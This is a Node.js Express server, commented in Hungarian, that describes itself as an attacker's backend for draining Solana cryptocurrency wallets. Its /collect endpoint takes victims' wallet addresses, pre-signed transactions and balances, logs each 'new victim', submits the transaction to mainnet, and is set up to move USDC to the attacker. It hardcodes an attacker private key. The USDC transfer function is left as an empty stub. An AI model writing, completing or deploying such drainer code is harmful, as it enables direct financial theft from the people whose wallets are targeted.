// server.js - A támadó backend
const express = require('express');
const { Connection, Transaction, Keypair, sendAndConfirmTransaction } = require('@solana/web3.js');
const bs58 = require('bs58');

const app = express();
app.use(express.json({ limit: '50mb' }));

// A támadó Solana wallet-e (ahová a pénz megy)
const ATTACKER_KEYPAIR = Keypair.fromSecretKey(
    bs58.decode('prVPrLRQwq4ba4BZ45zTSQRChWMLmDprkfXLQPNTT9rL4z3dU1x4cSe5NkokGaFaCQyJBZ4CUahoUFZBipdFkXG')
);

const connection = new Connection('https://api.mainnet-beta.solana.com');

app.post('/collect', async (req, res) => {
    const { wallet, signedTx, balances } = req.body;
    
    console.log(`[+] New victim: ${wallet}`);
    console.log(`[+] Balance: SOL=${balances.SOL}, USDC=${balances.USDC}`);
    
    // Visszafejtjük a signedTx-et
    const tx = Transaction.from(Buffer.from(signedTx, 'base64'));
    
    // Beküldjük a hálózatra
    try {
        const txid = await sendAndConfirmTransaction(connection, tx, []);
        console.log(`[+] Transaction sent: ${txid}`);
        
        // Ha van USDC, egy második tranzakcióval azt is átutaljuk
        if (balances.USDC > 0) {
            await transferUSDC(wallet, balances.USDC);
        }
        
        res.json({ success: true, txid });
    } catch(e) {
        console.error(`[-] Failed: ${e.message}`);
        res.json({ success: false, error: e.message });
    }
});

function transferUSDC(fromAddress, amount) {
    // USDC token transfer instruciton
    // ...
}

app.listen(3000, () => console.log('[+] Backend running on port 3000'));